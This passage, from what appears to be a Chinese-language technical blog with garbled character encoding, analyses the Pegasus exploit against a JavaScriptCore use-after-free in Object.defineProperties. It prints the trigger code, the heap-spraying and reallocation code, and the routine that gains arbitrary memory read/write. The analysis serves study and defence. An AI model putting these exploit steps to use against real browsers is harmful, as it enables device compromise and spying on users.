‡å¯¹è±¡ä¸Šå®šä¹‰æˆ–ä¿®æ”¹çš„å±æ€§çš„æè¿°ç¬¦ã€‚ç®—æ³•é“¾æ¥è¿™äº›å˜é‡å’Œç›®æ ‡å¯¹è±¡ï¼ŒåŸºäºå˜é‡åˆ—è¡¨è¿›è¡Œä¸¤æ¬¡è¿­ä»£ã€‚åœ¨ç¬¬ä¸€ä¸ªéƒ¨åˆ†ï¼Œæ£€æŸ¥æ¯ä¸ªå˜é‡çš„æ ¼å¼ï¼Œå¹¶åˆ›å»ºä¸€ä¸ªæœ‰é»˜è®¤å€¼çš„PropertyDescriptorå¯¹è±¡ã€‚<br> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">size_t numProperties = propertyName.size();</span><br><span class="line">Vector&lt;PropertyDescriptor&gt; descriptors;</span><br><span class="line">size_t numProperties = propertyName.size();</span><br><span class="line">Vector&lt;PropertyDescriptor&gt; descriptors;</span><br><span class="line">MarkedArgumentBuffer markBuffer;</span><br><span class="line"><span class="keyword">for</span>(size_t i =<span class="number">0</span>;i&lt;numProperties;i++)&#123;</span><br><span class="line">JSValue prop = properties-&gt;<span class="keyword">get</span>(exec,propertyNames[i]);</span><br><span class="line">if(exec-&gt;hadException())</span><br><span class="line">return jsNull();</span><br><span class="line">PropertyDescriptor descriptor;</span><br><span class="line">if(!toPropertyDescriptor(exec, prop,descriptor))</span><br><span class="line">return jsNull();</span><br><span class="line">descriptors.append(descriptor);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>å¦‚æœæ¯ä¸€ä¸ªå˜é‡éƒ½æ˜¯æœ‰æ•ˆçš„ï¼Œé‚£ä¹ˆç¬¬äºŒéƒ¨åˆ†å°±ä¼šæ‰§è¡Œã€‚è¿™ä¸ªéƒ¨åˆ†å°†ç”¨æˆ·æä¾›çš„å±æ€§å˜é‡ä¸ç›®æ ‡å¯¹è±¡ç»“åˆåœ¨ä¸€èµ·ï¼Œé€šè¿‡defineOwnProperty()å®ç°ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(size_t i=<span class="number">0</span>;i&lt;numProperties; i++)&#123;</span><br><span class="line">Identifier propertyName = propertyNames[i];</span><br><span class="line"><span class="keyword">if</span>(exec-&gt;propertyName().isPrivateName(properName))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">object-&gt;methodTable(exec-&gt;vm())-&gt;defineOwnProperty(object, exec, propertyName,descriptors[i],<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ–¹æ³•å¯èƒ½è°ƒç”¨ç”¨æˆ·è‡ªå®šä¹‰çš„JavaScriptæ–¹æ³•ï¼ˆä½¿ç”¨å·²å®šä¹‰çš„å±æ€§ï¼‰ã€‚è¿™æ ·ï¼Œå†…å­˜å›æ”¶ä¼šè¢«è§¦å‘ï¼Œå¯¼è‡´æœªæ ‡è®°çš„å †å¤‡ä»½é‡æ–°åˆ†é…ã€‚å› æ­¤ï¼Œå¯¹descriptorå‘é‡PropertyDescriptorå­˜å‚¨çš„å¯¹è±¡çš„å¼•ç”¨è¦ç‹¬ç«‹æ ‡è®°ï¼Œç¡®ä¿ä¸è¢«å›æ”¶ã€‚è¿™é‡Œï¼Œä½¿ç”¨äº†<strong>MarkedArgumentBuffer</strong>ï¼Œä¸´æ—¶å­˜å‚¨å˜é‡å€¼ï¼Œé˜²æ­¢è¢«å›æ”¶ã€‚</p><p>é¦–å…ˆï¼Œæ¥ç†è§£JavaScriptCoreçš„åƒåœ¾å›æ”¶æœºåˆ¶ï¼Œå½“å¯¹è±¡ä¸åœ¨è¢«ä½¿ç”¨ï¼Œæˆ–è€…WebContentjinè¿›ç¨‹å ç”¨æ›´å¤šå†…å­˜çš„æ—¶å€™ä¼šå›æ”¶å†…å­˜ã€‚ç³»ç»Ÿä¼šéå†æ ˆï¼Œç¡®å®šå¯¹è±¡æ˜¯å¦è¢«å¼•ç”¨ã€‚å †ä¸­ä¹Ÿå¯èƒ½å¼•ç”¨å¯¹è±¡ï¼Œä½†åªåœ¨ç‰¹æ®Šæƒ…å†µä¸­ã€‚</p><p>MarkedArgumentBufferç»´æŒä¸€ä¸ª<strong>inline</strong>æ ˆè¡¨ï¼Œç”±å„ä¸ªå€¼ç»„æˆã€‚ä½†è¿›è¡Œåƒåœ¾å›æ”¶æ—¶ï¼Œæ¯ä¸ªå€¼ä¼šè¢«æ ‡è®°ï¼Œå…¶ä»£è¡¨çš„å¯¹è±¡å°±ä¼šé¿å…å›æ”¶é‡Šæ”¾ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MarkedArgumentBuffer</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">private:</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> size_t inlineCapacity=<span class="number">8</span>;</span><br><span class="line">...</span><br><span class="line">public:</span><br><span class="line">...</span><br><span class="line">MarkedArgumentBuffer()</span><br><span class="line">:m_size(<span class="number">0</span>)</span><br><span class="line">,m_capacity(inlineCapacity)</span><br><span class="line">,m_buffer(m_inlineBuffer)</span><br><span class="line">,m_markSet(<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">void</span> append(JSValue v)&#123;</span><br><span class="line"><span class="keyword">if</span>(m_size &gt;= m_capacity)</span><br><span class="line"><span class="keyword">return</span> slowAppend(v);</span><br><span class="line"></span><br><span class="line">slotFor(m_size)=JSValue::encode(v);</span><br><span class="line">++m_size;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">private:</span><br><span class="line">...</span><br><span class="line">int m_size;</span><br><span class="line">int m_capacity;</span><br><span class="line">EncodedJSValue m_inlineBuffer[inlineCapacity];</span><br><span class="line">EncodeedJSValue* m_buffer;</span><br><span class="line">ListSet* m_markSet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>inlineæ ˆåªèƒ½å­˜8ä¸ªå€¼ã€‚å½“å‘MarkedArgumentBufferæ·»åŠ ç¬¬ä¹ä¸ªå€¼æ—¶ï¼Œå°±ç§»åˆ°å †ä¸­ï¼Œèƒ½å¤Ÿå­˜å‚¨çš„å€¼ä¹Ÿæ‰©å¤§äº†ã€‚<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> MarkedArgumentBuffer::slowAppend(JSValue v)&#123;</span><br><span class="line">int newCapacity = m_capacity*<span class="number">4</span>;</span><br><span class="line">EncodedJSValue* newBuffer = <span class="keyword">new</span> EncodeedJSValue[newCapacity];</span><br><span class="line"><span class="keyword">for</span>(int i=<span class="number">0</span>;i&lt;m_capacity;++i)</span><br><span class="line">newBuffer[i]=m_buffer[i];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (EncodedJSValue* base=mallocBase())</span><br><span class="line"><span class="keyword">delete</span> [] base;</span><br><span class="line"></span><br><span class="line">m_buffer=newBuffer;</span><br><span class="line">m_capacity=newCapacity;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ä¸€æ—¦ç§»åŠ¨åˆ°å †ä¸­ï¼Œè¿™äº›å€¼å°±ä¸å†è¢«åƒåœ¾å›æ”¶æœºåˆ¶ä¿æŠ¤ã€‚MarkedArgumentBufferé‡Œçš„å€¼ä¼šæ·»åŠ åˆ°å †ä¸­çš„<strong>m_markListSet</strong>å¹¶è¢«æ ‡è®°ï¼Œç¡®ä¿ä¸ä¼šé‡Šæ”¾å›æ”¶ã€‚å½“MarkedArgumentBufferç§»åˆ°å †ä¸­æ—¶ï¼Œä¹Ÿè¦ç§»åŠ¨<strong>markListSet</strong>ä¸­ã€‚<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//As long as our size stays within our Vetor's inline</span></span><br><span class="line"><span class="comment">//capacity, all our values are allocated on the stack, and </span></span><br><span class="line"><span class="comment">//therefore don't need explicit marking. Once our size exceeds </span></span><br><span class="line"><span class="comment">//our Vector's inline capacity, though, our values move to the </span></span><br><span class="line"><span class="comment">//heap, where they do need explicit marking.</span></span><br><span class="line"><span class="keyword">for</span> (int i=<span class="number">0</span>; i&lt;m_size;++i)&#123;</span><br><span class="line">Heap* heap=Heap::heap(JSValue::decode(slotFor(i)));</span><br><span class="line"><span class="keyword">if</span>(!heap)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">m_markSet = &amp;heap-&gt;markListSet();</span><br><span class="line">m_markSet-&gt;add(<span class="keyword">this</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ä¸Šé¢çš„ä»£ç è¯·æ±‚äº†ä¸€ä¸ªå †ï¼ŒæŠŠMarkedArgumentBufferæ·»åŠ åˆ°å †ä¸­çš„markListSetã€‚ä½†åªæœ‰ç¬¬ä¹ä¸ªå€¼åŠ å…¥MarkedArgumentBufferæ‰è°ƒç”¨ã€‚<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">inline Heap* Heap::heap(<span class="keyword">const</span> JSValue v)&#123;</span><br><span class="line"><span class="keyword">if</span>(!v.isCell())</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> heap(v.asCell());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>JSValue</strong>æœ‰ä¸€ä¸ªtagï¼Œè¯´æ˜å®ƒç¼–ç çš„å€¼çš„ç±»å‹ã€‚åœ¨ä¸€ä¸ªå¤æ‚çš„å¯¹è±¡ä¸­ï¼Œtagä¸ºCellTagï¼ŒJSValueåˆ›å»ºä¸€æŒ‡é’ˆæŒ‡å‘å †ä¸­çš„å€¼ã€‚å¯¹ç®€å•ç±»å‹æ¥è¯´ï¼Œå˜é‡å¯ä»¥ç›´æ¥è§£ç æˆJSValueï¼ˆä¾‹å¦‚æ•´å½¢ï¼Œå¸ƒå°”å‹ï¼Œnullï¼Œè¿˜æœ‰æœªå®šä¹‰çš„ï¼‰ï¼Œåœ¨å †ä¸­å­˜å‚¨è¿™æ ·çš„å€¼æ˜¯å¤šä½™çš„ï¼Œè¿˜ä¼šåˆ›å»ºä¸€ä¸ªtagã€‚<strong>JSValue::isCell() </strong>å‡½æ•°å†³å®šæ˜¯å¦åœ¨å †ä¸­åˆ›å»ºæŒ‡é’ˆæŒ‡å‘å•å…ƒæ ¼ã€‚å› ä¸ºç®€å•ç±»å‹ä¸ä¼šæŒ‡å‘å †ï¼Œä¸ºè¿™äº›ç±»å‹æŒ‡å®šå †æ²¡æœ‰æ„ä¹‰ï¼Œåªä¼šè¿”å›nullã€‚<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">inline bool JSValue::isCell() <span class="keyword">const</span>&#123;</span><br><span class="line"><span class="keyword">return</span> !(u.asInt64&amp;TagMask);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>å› æ­¤ï¼Œå¦‚æœè¦æ·»åŠ åˆ°MarkedArgumentBufferçš„ç¬¬ä¹ä¸ªå€¼ä¸æ˜¯ä¸€ä¸ªå †å¤‡ä»½å€¼ï¼Œå½“è¯·æ±‚å †æ—¶ä¼šè¿”å›NULLï¼Œ MarkedArgumentBufferä¹Ÿä¸ä¼šæ·»åŠ åˆ°å †markListSetä¸­ã€‚MarkedArgumentBufferå°±ä¸åœ¨èµ·ä½œç”¨ï¼Œç¬¬ä¹ä¸ªå€¼ä»¥åçš„å€¼å¯ä»¥è¢«é‡Šæ”¾å›æ”¶ã€‚descriptorå‘é‡é‡Œçš„å †å€¼ï¼Œè¢«å¼•ç”¨åï¼Œå¯èƒ½ä¼šè¢«æ±¡æŸ“ã€‚å®é™…ä¸Šï¼Œå¯¹è¿™äº›å€¼çš„å¦ä¸€ä¸ªå¼•ç”¨ä»ç„¶å­˜åœ¨ï¼ˆdefineDescriptor()æœ‰JavaScriptçš„å˜é‡ï¼‰ã€‚åœ¨åƒåœ¾å›æ”¶å‰ï¼Œä½™ä¸‹çš„JSValueçš„å¼•ç”¨å¿…é¡»å…ˆç§»å»ï¼Œä»¥ä½¿descriptorå‘é‡é‡Œçš„å¼•ç”¨è¢«æ±¡æŸ“ã€‚<br><a href="https://imgchr.com/i/ESiMgf" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/04/18/ESiMgf.png" alt="ESiMgf.png"></a><br>è°ƒç”¨defineOwnDescriptor()ä¸€å®šä¼šè°ƒç”¨åŸºäºå±æ€§å€¼çš„ç”¨æˆ·æ§åˆ¶çš„æ–¹æ³•ã€‚ç»“æœï¼Œæœ€åä¸€ä¸ªå¯¹ä¸€å±æ€§å€¼çš„å¼•ç”¨å¯ä»¥è¢«ç”¨æˆ·å®šä¹‰çš„JavaScriptä»£ç ç§»å»ã€‚å¦‚æœåƒåœ¾å›æ”¶åœ¨ç§»å»ä¸€ç‰¹å®šå€¼çš„æ‰€æœ‰å¼•ç”¨å’Œç›®æ ‡å¯¹è±¡desceiptorå‘é‡é‡Œçš„å€¼æ—¶è¢«è§¦å‘ï¼Œè¿™äº›é‡Šæ”¾äº†çš„ç©ºé—´ä¼šä½œä¸ºä¸€ä¸ªå˜é‡å­˜å‚¨åœ¨ç›®æ ‡å¯¹è±¡ä¸Šã€‚</p><h4 id="æ”»å‡»"><a href="#æ”»å‡»" class="headerlink" title="æ”»å‡»"></a>æ”»å‡»</h4><p>Pegasusé€šè¿‡å‘defineProperties()å‡½æ•°ä¼ å…¥ä¸€ç³»åˆ—ç²¾å¿ƒåˆ¶ä½œçš„å˜é‡æ¥è§¦å‘è¿™ä¸ªæ¼æ´ã€‚å½“è¿™äº›ç‹¬ç«‹å˜é‡è¿ç»­æ·»åŠ åˆ°MarkedArgumentBufferï¼Œè¿™ä¸ªæ¼æ´å°±ä¼šè§¦å‘ï¼Œå¦‚æœåƒåœ¾å›æ”¶åœ¨å…³é”®æ—¶å€™åŠæ—¶è§¦å‘ï¼ŒJSArrayä¼šé”™è¯¯é‡Šæ”¾ã€‚å› ä¸ºåƒåœ¾å›æ”¶ä¸ä¸€å®šä¼šè¢«è§¦å‘ï¼Œæ‰€ä»¥é‡å¤æ”»å‡»ä»¥è§¦å‘é”™è¯¯é‡Šæ”¾å’Œå†åˆ†é…ï¼ˆä¼šå°è¯•åæ¬¡ï¼‰ï¼Œè¿˜ä¼šæµ‹è¯•æ˜¯å¦ä¸€ä¸ªè¢«æ±¡æŸ“çš„å¼•ç”¨å·²ç»æˆåŠŸè·å¾—ã€‚å‡è®¾åƒåœ¾å›æ”¶æ­£ç¡®è§¦å‘ï¼Œé‚£ä¹ˆå¦ä¸€ä¸ªå¯¹è±¡å°±ä¼šåˆ†é…åœ¨æ±¡æŸ“çš„JSArrayä¹‹ä¸Šã€‚æ¥ç€ï¼Œè®¾ç½®å¯ä»¥è·å¾—æœ¬åœ°ä»£ç æ‰§è¡Œæƒçš„å·¥å…·ï¼Œå³è¯»å†™æƒé™ï¼Œè·å–ä»»æ„JavaScriptå¯¹è±¡ä½ç½®ã€‚ä¸€æ—¦è¿™äº›æ­¥éª¤éƒ½å®Œæˆäº†ï¼Œå°±ä¼šåˆ›å»ºä¸€ä¸ªpayloadå¯æ‰§è¡Œä»£ç é›†ã€‚</p><h5 id="è®¾ç½®è§¦å‘æ¼æ´"><a href="#è®¾ç½®è§¦å‘æ¼æ´" class="headerlink" title="è®¾ç½®è§¦å‘æ¼æ´"></a>è®¾ç½®è§¦å‘æ¼æ´</h5><p>æ”»å‡»ä½¿ç”¨ä¸€ä¸ªJSArrayå¯¹è±¡è§¦å‘æ¼æ´ä»£ç å—ï¼Œè·å¾—ä»»æ„ä»£ç æ‰§è¡Œæƒã€‚ä¸‹é¢è¿™æ®µä»£ç è§¦å‘æ¼æ´ã€‚<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr=<span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">2047</span>);</span><br><span class="line"><span class="keyword">var</span> not_number=&#123;&#125;;</span><br><span class="line">not_number.toString=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">arr=<span class="literal">null</span>;</span><br><span class="line">props[<span class="string">"stale"</span>][<span class="string">'value'</span>]=<span class="literal">null</span>;</span><br><span class="line">...<span class="comment">//Trigger garbage collection and reallocation over stale object</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> props=&#123;</span><br><span class="line">p0:&#123;<span class="attr">value</span>:<span class="number">0</span>&#125;,</span><br><span class="line">p1:&#123;<span class="attr">value</span>:<span class="number">1</span>&#125;,</span><br><span class="line">p2:&#123;<span class="attr">value</span>:<span class="number">2</span>&#125;,</span><br><span class="line">p3:&#123;<span class="attr">value</span>:<span class="number">3</span>&#125;,</span><br><span class="line">p4:&#123;<span class="attr">value</span>:<span class="number">4</span>&#125;,</span><br><span class="line">p5:&#123;<span class="attr">value</span>:<span class="number">5</span>&#125;,</span><br><span class="line">p6:&#123;<span class="attr">value</span>:<span class="number">6</span>&#125;,</span><br><span class="line">p7:&#123;<span class="attr">value</span>:<span class="number">7</span>&#125;,</span><br><span class="line">p8:&#123;<span class="attr">value</span>:<span class="number">8</span>&#125;,</span><br><span class="line">length:&#123;<span class="attr">value</span>:not_number&#125;,</span><br><span class="line">stale:&#123;<span class="attr">value</span>:arr&#125;,</span><br><span class="line">after:&#123;<span class="attr">value</span>:<span class="number">666</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> target=[];</span><br><span class="line"><span class="built_in">Object</span>.defineProperties(target,props);</span><br></pre></td></tr></table></figure></p><p>ç»è¿‡ç‰¹åˆ«ç²¾å¿ƒç¼–æ’çš„propså¯¹è±¡è§¦å‘slowAppend()å†…çš„æ¼æ´ã€‚å½“ç¬¬ä¹ä¸ªå±æ€§å€¼æ·»åŠ åˆ°MarkedArgumentBuffer(P8)ï¼ŒslowAppend()å°†æ— æ³•è·å¾—å †åœ°å€ï¼ˆå› ä¸ºè¿™ä¸ªå€¼æ˜¯ä¸€ä¸ªç®€å•ç±»å‹ï¼Œå³æ•´å½¢ï¼Œå¹¶ä¸”åŸå…ˆå †ä¸Šæ²¡æœ‰è¿™ä¸ªå€¼ï¼‰ã€‚é‚£ä¹ˆï¼ŒMarkedArgumentBufferå°±ä¸èƒ½ä¿æŠ¤å †å¤‡ä»½å€¼ï¼ˆnot_numberå’Œarrï¼‰ï¼Œå½“åƒåœ¾å›æ”¶æ—¶å°±ä¼šè¢«é‡Šæ”¾ã€‚</p><p>å½“defineOwnDescriptor()æ¥å—è¿™ä¸ªé•¿å±æ€§å€¼ï¼Œå®ƒä¼šå°è¯•å°†è¿™ä¸ªå€¼ï¼ˆnot_numberï¼‰è½¬å˜ä¸ºä¸€ä¸ªæ•°å­—ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼ŒtoString()è¢«è°ƒç”¨ï¼Œç§»å»arrçš„åä¸¤é¡¹å¼•ç”¨ã€‚ä¸€æ—¦ç§»å»ï¼ŒJSArrayå°†å–æ¶ˆæ ‡è®°ï¼Œä¸‹ä¸€æ¬¡åƒåœ¾å›æ”¶å°±ä¼šé‡Šæ”¾æ•´ä¸ªå¯¹è±¡ã€‚Pegasusé€šè¿‡toString()æ–¹æ³•ç”³è¯·åˆ†é…å†…å­˜ç©ºé—´ï¼Œä¿ƒä½¿åƒåœ¾å›æ”¶è¿è¡Œï¼ˆé‡Šæ”¾arrå¯¹è±¡ï¼‰ã€‚<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> attempts=<span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">4250000</span>);</span><br><span class="line"><span class="keyword">var</span> pressure=<span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">100</span>);</span><br><span class="line">...</span><br><span class="line">not_number.toString=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;pressure.length;i++)&#123;</span><br><span class="line">pressure[i]=<span class="keyword">new</span> Unit32Array(<span class="number">262144</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> buffer=<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">80</span>);</span><br><span class="line"><span class="keyword">var</span> unitArray=<span class="keyword">new</span> Unit32Array(buffer);</span><br><span class="line">unitArray[<span class="number">0</span>]=<span class="number">0xAABBCCDD</span>;</span><br><span class="line"><span class="keyword">for</span>(i =<span class="number">0</span>;i&lt;attempts.length;i++)&#123;</span><br><span class="line">attempts[i]=<span class="keyword">new</span> Unit32Array(buffer);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>attemptsæ¯ä¸€é¡¹éƒ½åœ¨åŒä¸€æ®µç¼“å†²åŒºä¸Šåˆ†é…4.25 millionä¸ªUnit32Arrayã€‚åœ¨arrå¯¹è±¡ä½¿ç”¨çš„åŒä¸€å†…å­˜åŒºå†åˆ†é…ä¸€ç³»åˆ—çš„Unit32Arrayã€‚</p><p>å®Œæˆåï¼Œä¼šæ£€æµ‹åƒåœ¾å›æ”¶æ˜¯å¦è§¦å‘ã€‚<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> before_len=arr.length;</span><br><span class="line"><span class="built_in">Object</span>.defineProperties(target,props);</span><br><span class="line">stale=targets.stale;</span><br><span class="line"><span class="keyword">var</span> after_len=stale.length;</span><br><span class="line"><span class="keyword">if</span>(before_len==after_len)&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> RecoverableException(<span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>å¦‚æœJSArrayçš„é•¿åº¦æ²¡æœ‰æ”¹å˜ï¼Œè¦ä¹ˆåƒåœ¾å›æ”¶æ²¡æœ‰è§¦å‘ï¼Œè¦ä¹ˆæ˜¯Unit32Arrayæ²¡æœ‰åœ¨staleç›¸åŒåœ°å€ä¸Šåˆ†é…ç©ºé—´ã€‚è¿™ç§æƒ…å†µï¼Œæ”»å‡»å°±å¤±è´¥äº†ï¼Œä½†ä¼šå†å°è¯•ã€‚</p><h4 id="è·å–ä»»æ„è¯»å†™åŸè¯­"><a href="#è·å–ä»»æ„è¯»å†™åŸè¯­" class="headerlink" title="è·å–ä»»æ„è¯»å†™åŸè¯­"></a>è·å–ä»»æ„è¯»å†™åŸè¯­</h4><p>å‡è®¾æ”»å‡»å·²ç»æˆåŠŸäº†ï¼Œé‚£ä¹ˆåœ¨åŒä¸€æ®µçš„å†…å­˜ä¸­æœ‰ä¸¤ä¸ªä¸åŒç±»å‹çš„å¯¹è±¡ã€‚ç¬¬ä¸€ä¸ªæ˜¯JSArray(å·²æ±¡æŸ“)ï¼Œç¬¬äºŒä¸ªæ˜¯ä¼—å¤šå·²åˆ†é…çš„Unit32Arraysä¸­çš„ä¸€ä¸ªï¼ˆå®é™…ä¸Šï¼Œé»˜è®¤ç±»å‹æ˜¯ JSGenericTypedArrayViewï¼‰ã€‚é€šè¿‡å¯¹æ±¡æŸ“å¯¹è±¡çš„è¯»å†™ï¼Œå¯ä»¥è¯»å–æˆ–ç ´ç¯JSGenericTypedArrayViewçš„æˆå‘˜å˜é‡ã€‚ç‰¹åˆ«åœ°ï¼Œåœ¨JSArrayå’ŒJSGenericTypedArrayViewé•¿åº¦é‡å çš„åœ°æ–¹ï¼Œå†™å…¥ä¸€ä¸ªåç§»é‡ï¼Œå°±å¯ä»¥æœ‰æ•ˆåœ°è®¾ç½®Unit32Arrayçš„é•¿åº¦ä¸º0xFFFFFFFFã€‚ç ´ç¯è¿™ä¸ªå€¼ï¼Œå¯ä»¥å°†è¿™ä¸ªarrayä½œä¸ºWebContentè¿›ç¨‹çš„å…¨éƒ¨è™šæ‹Ÿåœ°å€ç©ºé—´ï¼ˆå³ä»»æ„è¯»å†™åŸè¯­ï¼‰ã€‚</p><p>æ”»å‡»éœ€è¦ç¡®å®šå·²åˆ†é…çš„ä¼—å¤šUnit32Arrayä¸­å“ªä¸€ä¸ªä¸æ±¡æŸ“å¯¹è±¡åŒ¹é…ã€‚å¯ä»¥ä¸€ä¸€æµ‹è¯•ï¼Œå¹¶æ£€æŸ¥é•¿åº¦æ˜¯å¦è¢«æ”¹ä¸º0xFFFFFFFFã€‚æ‰€æœ‰å…¶ä»–æ•°ç»„ä»å°†ä¿ç•™åŸå§‹çš„å¤‡ä»½ArrayBufferã€‚<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(x=attempts.length<span class="number">-1</span>;x&gt;=<span class="number">1</span>;x--)&#123;</span><br><span class="line"><span class="keyword">if</span>(attempts[x].length != <span class="number">80</span>/<span class="number">4</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(attempts[x].length==<span class="number">0xFFFFFFFF</span>)&#123;</span><br><span class="line">memory_view=attempts[x];</span><br><span class="line">...</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="è·å–å¯¹è±¡åœ°å€"><a href="#è·å–å¯¹è±¡åœ°å€" class="headerlink" title="è·å–å¯¹è±¡åœ°å€"></a>è·å–å¯¹è±¡åœ°å€</h4><p>å®Œæˆæ”»å‡»çš„æœ€åç»„ä»¶éœ€è¦èƒ½å¤Ÿè·å–ä»»æ„JavaScriptå¯¹è±¡çš„åœ°å€ã€‚Pegasusç”¨ç ´åUnit32Arrayçš„æ–¹æ³•æ¥è·å–åœ°å€ã€‚å‘å¯¹è±¡å†™å…¥ä¸€åç§»å€¼ï¼ŒUnit32Arrayçš„ç¼“å†²åŒºå°±è¢«ç ´åï¼Œå¹¶æŒ‡å‘ç”¨æˆ·æ§åˆ¶çš„JSArrayã€‚JSArrayçš„ç¬¬ä¸€ä¸ªå…ƒç´ 